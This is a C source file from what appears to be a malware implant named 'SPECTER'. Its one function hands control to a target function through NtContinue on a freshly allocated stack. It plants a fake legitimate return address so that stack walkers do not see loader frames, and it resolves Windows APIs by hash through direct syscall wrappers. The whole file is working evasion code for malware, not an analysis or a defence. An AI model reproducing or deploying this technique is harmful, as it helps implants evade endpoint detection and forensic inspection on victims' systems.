/**
 * SPECTER Implant - NtContinue Entry Transfer
 *
 * Transfers execution to a target function using NtContinue with a
 * synthetic CONTEXT64 and a fresh stack. This provides:
 *   1. A fresh stack with no direct loader frames below the target entry
 *   2. A legitimate-module return address at the top of the synthetic stack
 *   3. Clean register state derived from the current thread context
 *
 * NtContinue replaces the current thread context with the supplied CONTEXT64.
 */

#include "specter.h"
#include "ntdefs.h"
#include "sleep.h"
#include "syscalls.h"
#include "evasion.h"
#include "peb.h"

/* Stack allocation size for the synthetic stack (64 KB) */
#define NTCONTINUE_STACK_SIZE   0x10000

static PVOID resolve_basethreadinitthunk(void) {
    PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
    if (!k32)
        return NULL;
    return find_export_by_hash(k32, HASH_BASETHREADINITTHUNK);
}

static PVOID resolve_rtluserthreadstart(void) {
    PVOID ntdll = find_module_by_hash(HASH_NTDLL_DLL);
    if (!ntdll)
        return NULL;
    return find_export_by_hash(ntdll, HASH_RTLUSERTHREADSTART);
}

NTSTATUS evasion_ntcontinue_transfer(EVASION_CONTEXT *ctx,
                                      PVOID target_func, PVOID param) {
    if (!ctx || !target_func)
        return STATUS_INVALID_PARAMETER;

    NTSTATUS status;
    PVOID stack_base = NULL;
    SIZE_T stack_size = NTCONTINUE_STACK_SIZE;
    HANDLE current_process = (HANDLE)(ULONG_PTR)-1;

    status = spec_NtAllocateVirtualMemory(
        current_process,
        &stack_base,
        0,
        &stack_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (!NT_SUCCESS(status))
        return status;

    PVOID basethreadinitthunk = resolve_basethreadinitthunk();
    PVOID rtluserthreadstart = resolve_rtluserthreadstart();
    PVOID ntdll = find_module_by_hash(HASH_NTDLL_DLL);
    fn_RtlCaptureContext pRtlCaptureContext = NULL;
    if (ntdll) {
        pRtlCaptureContext = (fn_RtlCaptureContext)
            find_export_by_hash(ntdll, HASH_RTLCAPTURECONTEXT);
    }

    PBYTE stack_top = (PBYTE)stack_base + stack_size;
    QWORD *sp = (QWORD *)(((ULONG_PTR)(stack_top - 256) & ~(ULONG_PTR)0xF) - 8);
    spec_memset(sp, 0, 8 * sizeof(QWORD));

    /* Windows x64 function entry expects [RSP] to be the return address,
       followed by 32 bytes of shadow space. The target should not return,
       but this top slot is also what simple stack walkers inspect first. */
    sp[0] = (QWORD)(ULONG_PTR)(basethreadinitthunk ? basethreadinitthunk
                                                   : rtluserthreadstart);
    sp[1] = 0;  /* RCX home */
    sp[2] = 0;  /* RDX home */
    sp[3] = 0;  /* R8 home  */
    sp[4] = 0;  /* R9 home  */
    if (rtluserthreadstart)
        sp[5] = (QWORD)(ULONG_PTR)rtluserthreadstart;

    CONTEXT64 thread_ctx;
    spec_memset(&thread_ctx, 0, sizeof(CONTEXT64));
    if (pRtlCaptureContext)
        pRtlCaptureContext(&thread_ctx);

    thread_ctx.ContextFlags = CONTEXT_FULL_FLAGS;
    thread_ctx.Rip = (QWORD)(ULONG_PTR)target_func;
    thread_ctx.Rsp = (QWORD)(ULONG_PTR)sp;
    thread_ctx.Rcx = (QWORD)(ULONG_PTR)param;

    status = spec_NtContinue(&thread_ctx, FALSE);
    return status;
}
